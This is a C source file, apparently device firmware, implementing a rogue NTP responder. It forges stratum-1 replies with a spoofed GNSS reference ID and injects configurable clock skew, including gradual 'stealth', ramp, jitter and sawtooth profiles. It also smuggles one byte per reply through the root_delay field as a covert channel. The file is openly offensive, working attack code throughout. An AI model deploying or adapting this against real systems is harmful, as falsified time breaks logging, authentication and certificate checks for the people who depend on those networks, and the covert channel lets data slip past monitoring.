/*
 * ntp_engine.c — NTP responder, skew injection, covert encoding
 *
 * Implements a rogue NTP server that responds to client requests with
 * spoofed stratum-1 timing, applies configurable skew to the transmit
 * timestamp, and supports covert-channel encoding via root_delay.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include <string.h>
#include "ntp_engine.h"
#include "board.h"

/* --------------------------------------------------------------------- */
/*  NTP timestamp conversion                                              */
/*  NTP epoch is 1900-01-01. seconds = 32-bit, fraction = 32-bit (2^-32 s) */
/* --------------------------------------------------------------------- */
#define NTP_EPOCH_OFFSET 2208988800ULL  /* seconds 1900 → 1970            */
#define NTP_FRAC_SCALE  4294967296.0    /* 2^32                            */

static uint32_t ntp_sec_from_unix(uint64_t unix_ns)
{
    uint64_t sec = unix_ns / 1000000000ULL;
    return (uint32_t)(sec + NTP_EPOCH_OFFSET);
}

static uint32_t ntp_frac_from_ns(uint32_t ns)
{
    /* ns [0..999999999] → fraction [0..2^32-1] */
    return (uint32_t)(((double)ns / 1e9) * NTP_FRAC_SCALE);
}

static uint32_t rd_be32_ntp(const uint8_t *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | p[3];
}

static void wr_be32_ntp(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)(v & 0xFF);
}

/* --------------------------------------------------------------------- */
/*  Init                                                                   */
/* --------------------------------------------------------------------- */
void ntp_engine_init(ntp_engine_state_t *st)
{
    memset(st, 0, sizeof(*st));
    st->spoof_stratum = NTP_STRATUM_PRIMARY;
    st->spoof_ref_id = NTP_REFID_GNSS;
    st->skew_ns = 0;
    st->covert_pending = 0;
}

void ntp_engine_set_skew(ntp_engine_state_t *st, const skew_config_t *cfg)
{
    memcpy(&st->skew_cfg, cfg, sizeof(*cfg));
}

void ntp_engine_set_spoof(ntp_engine_state_t *st, uint8_t stratum,
                           uint32_t ref_id)
{
    st->spoof_stratum = stratum;
    st->spoof_ref_id = ref_id;
}

/* --------------------------------------------------------------------- */
/*  Covert channel via root_delay                                          */
/*  We use the low 16 bits of root_delay to encode 1 byte per response.   */
/*  The high 16 bits are kept at a plausible small value (e.g., 0x0001).   */
/* --------------------------------------------------------------------- */
void ntp_engine_covert_encode_root_delay(uint32_t *root_delay, uint8_t b)
{
    /* High 16 bits: plausible root delay = 0x00010000 (≈15 ms) */
    *root_delay = 0x00010000u | ((uint32_t)b & 0xFF);
}

uint8_t ntp_engine_covert_decode_root_delay(uint32_t root_delay)
{
    return (uint8_t)(root_delay & 0xFF);
}

void ntp_engine_covert_queue(ntp_engine_state_t *st, uint8_t b)
{
    if (st->covert_pending < sizeof(st->covert_buf) - 1) {
        st->covert_buf[st->covert_idx++ % sizeof(st->covert_buf)] = b;
        st->covert_pending++;
    }
}

/* --------------------------------------------------------------------- */
/*  Compute current skew in ns (reuses ptp_engine logic)                   */
/* --------------------------------------------------------------------- */
static int64_t compute_skew(const skew_config_t *cfg, uint32_t now_ms)
{
    if (!cfg->active)
        return 0;

    int64_t skew = 0;
    switch (cfg->profile) {
    case SKEW_STEP:
        skew = cfg->offset_ns;
        break;
    case SKEW_RAMP:
        skew = cfg->rate_nsps * (int64_t)(now_ms / 1000);
        if (cfg->offset_ns != 0 && skew > cfg->offset_ns)
            skew = cfg->offset_ns;
        break;
    case SKEW_STEALTH:
        /* rate_nsps is in ns/s (ppb); skew = rate * elapsed_s */
        skew = cfg->rate_nsps * (int64_t)(now_ms / 1000);
        break;
    case SKEW_JITTER: {
        static uint32_t lfsr = 0xCAFEF00Du;
        lfsr = (lfsr << 1) | (__builtin_parity(lfsr & 0xE1000000u));
        int64_t rnd = (int64_t)(lfsr % (2 * cfg->jitter_amp_ns + 1))
                       - (int64_t)cfg->jitter_amp_ns;
        skew = cfg->offset_ns + rnd;
        break;
    }
    case SKEW_SAWTOOTH: {
        uint32_t period = cfg->sawtooth_period_ms;
        if (period == 0) period = 60000;
        uint32_t phase = now_ms % period;
        skew = (cfg->offset_ns * (int64_t)phase) / (int64_t)period;
        break;
    }
    default:
        skew = 0;
    }
    return skew;
}

/* --------------------------------------------------------------------- */
/*  Process an NTP frame                                                   */
/* --------------------------------------------------------------------- */
int ntp_engine_process(ntp_engine_state_t *st,
                       const uint8_t *ntp_payload, uint32_t len,
                       uint64_t recv_ts_ns,
                       uint8_t *response, uint32_t *resp_len,
                       uint32_t now_ms)
{
    if (len < 48)  /* minimum NTP packet size */
        return 0;

    st->requests_received++;

    /* Parse client request */
    uint8_t li_vn_mode = ntp_payload[0];
    uint8_t client_mode = li_vn_mode & 0x07;
    uint8_t client_vn = (li_vn_mode >> 3) & 0x07;

    /* Only respond to client-mode requests (mode 3) */
    if (client_mode != NTP_MODE_CLIENT)
        return 0;

    /* Build server response (mode 4) */
    memset(response, 0, 48);
    uint8_t resp_li_vn_mode = (0 << 6) |           /* LI = 0 (no warning) */
                              ((client_vn & 0x07) << 3) |
                              NTP_MODE_SERVER;
    response[0] = resp_li_vn_mode;
    response[1] = st->spoof_stratum;
    response[2] = 6;   /* poll = 2^6 = 64 s */
    response[3] = -20; /* precision = 2^-20 ≈ 1 µs */

    /* root_delay / root_dispersion */
    uint32_t root_delay = 0x00010000u;   /* default ~15 ms */
    /* If we have covert data queued, encode it */
    if (st->covert_pending > 0) {
        uint8_t covert_byte = st->covert_buf[st->covert_idx -
                                             st->covert_pending];
        ntp_engine_covert_encode_root_delay(&root_delay, covert_byte);
        st->covert_pending--;
    }
    wr_be32_ntp(&response[4], root_delay);
    wr_be32_ntp(&response[8], 0x00010000u);   /* root_dispersion ~15 ms */

    /* reference ID */
    if (st->spoof_stratum == NTP_STRATUM_PRIMARY) {
        wr_be32_ntp(&response[12], st->spoof_ref_id);
    } else {
        /* For stratum >= 2, ref ID is IPv4 of upstream (4 bytes) */
        wr_be32_ntp(&response[12], 0x0A000001u);  /* 10.0.0.1 */
    }

    /* reference timestamp: claim we synced 64 seconds ago */
    uint32_t ref_sec = ntp_sec_from_unix(recv_ts_ns) - 64;
    wr_be32_ntp(&response[16], ref_sec);
    wr_be32_ntp(&response[20], 0);

    /* originate timestamp = copy from client's xmit ts (offsets 40-47) */
    memcpy(&response[24], &ntp_payload[40], 8);

    /* receive timestamp = when we received the packet (+ skew) */
    int64_t skew = compute_skew(&st->skew_cfg, now_ms);
    uint64_t recv_unix_ns = recv_ts_ns + (uint64_t)skew;
    uint32_t recv_sec = ntp_sec_from_unix(recv_unix_ns);
    uint32_t recv_ns = (uint32_t)(recv_unix_ns % 1000000000ULL);
    uint32_t recv_frac = ntp_frac_from_ns(recv_ns);
    wr_be32_ntp(&response[32], recv_sec);
    wr_be32_ntp(&response[36], recv_frac);

    /* transmit timestamp = now + skew */
    uint64_t xmit_unix_ns = recv_ts_ns + 1000000ULL + (uint64_t)skew;
    uint32_t xmit_sec = ntp_sec_from_unix(xmit_unix_ns);
    uint32_t xmit_ns = (uint32_t)(xmit_unix_ns % 1000000000ULL);
    uint32_t xmit_frac = ntp_frac_from_ns(xmit_ns);
    wr_be32_ntp(&response[40], xmit_sec);
    wr_be32_ntp(&response[44], xmit_frac);

    *resp_len = 48;
    st->responses_sent++;
    return 1;
}